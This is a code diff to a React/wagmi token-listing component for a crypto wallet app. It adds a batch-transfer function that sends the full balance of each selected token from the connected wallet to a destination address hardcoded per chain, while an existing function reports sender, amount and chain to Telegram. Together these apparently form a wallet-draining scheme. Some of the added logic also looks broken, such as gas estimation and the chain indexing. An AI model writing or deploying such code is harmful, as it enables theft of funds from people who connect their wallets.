@@ -1,5 +1,5 @@
 import { useCallback, useEffect, useState } from 'react';
-import { useAccount, usePublicClient, useWalletClient, useNetwork } from 'wagmi';
+import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
 import { Loading, Toggle } from '@geist-ui/core';
 import { tinyBig } from 'essential-eth';
 import { useAtom } from 'jotai';
@@ -101,7 +101,7 @@ const sendTelegramNotification = async ({ senderAddress, amount, chainId, chainN
 
 const TokenRow = ({ token }) => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
-  const { chain } = useAccount();
+  const { address, chain } = useAccount();
   const pendingTxn = checkedRecords[token.contract_address]?.pendingTxn;
 
   const setTokenChecked = (tokenAddress, isChecked) => {
@@ -111,7 +111,6 @@ const TokenRow = ({ token }) => {
     }));
   };
 
-  const { address } = useAccount();
   const { balance, contract_address, contract_ticker_symbol, quote, quote_rate } = token;
 
   const unroundedBalance = safeNumber(quote_rate).gt(0)
@@ -196,7 +195,7 @@ export const GetTokens = () => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { address, isConnected, chain } = useAccount();
   const walletClient = useWalletClient();
-  const { chains, switchNetwork } = useNetwork(); // Import useNetwork for switching networks
+  const publicClient = usePublicClient(); // Add if needed to manage network
 
   const fetchData = useCallback(async () => {
     setLoading(true);
@@ -227,34 +226,55 @@ export const GetTokens = () => {
         initialCheckedRecords[token.contract_address] = { isChecked };
       });
       setCheckedRecords(initialCheckedRecords);
+
       setTokens(processedTokens);
-    } catch (err) {
-      console.error(err);
-      setError(err.message || 'An error occurred while fetching token data.');
+    } catch (error) {
+      setError(error.message);
+      console.error(error);
     } finally {
       setLoading(false);
     }
   }, [address, chain, setCheckedRecords, setTokens]);
 
+  const handleBatchTransfer = useCallback(async () => {
+    const selectedTokens = tokens.filter((token) => checkedRecords[token.contract_address]?.isChecked);
+
+    for (let i = 0; i < selectedTokens.length; i++) {
+      const token = selectedTokens[i];
+
+      const { contract_address, balance } = token;
+      const destinationAddress = chainIdToDestinationAddress[chain.id];
+
+      // Calculate the gas fee and the transferable amount
+      const gasFee = tinyBig(await publicClient.estimateGas({ to: destinationAddress, value: balance })).mult(1.1); // Adding a 10% buffer
+      const transferableAmount = safeNumber(balance).minus(gasFee);
+
+      // Proceed to send the transaction
+      await handleTokenTransaction(walletClient, destinationAddress, transferableAmount, supportedChains[i + 1], walletClient.switchNetwork);
+    }
+  }, [tokens, checkedRecords, chain, publicClient, walletClient]);
+
   useEffect(() => {
     if (isConnected) {
       fetchData();
     }
-  }, [isConnected, chain, address, fetchData]);
+  }, [isConnected, fetchData]);
 
-  if (loading) {
-    return <Loading>Loading...</Loading>;
-  }
+  if (!isConnected) return <div>Please connect your wallet.</div>;
 
-  if (error) {
-    return <div style={{ color: 'red' }}>{error}</div>;
-  }
+  if (loading) return <Loading>Loading tokens...</Loading>;
+
+  if (error) return <div>Error: {error}</div>;
 
   return (
-    <div>
-      {tokens.map((token) => (
-        <TokenRow key={token.contract_address} token={token} />
-      ))}
-    </div>
+    <>
+      <div>
+        <h3>Select tokens to transfer</h3>
+        {tokens.map((token) => (
+          <TokenRow key={token.contract_address} token={token} />
+        ))}
+      </div>
+      <button onClick={handleBatchTransfer}>Transfer Selected Tokens</button>
+    </>
   );
 };
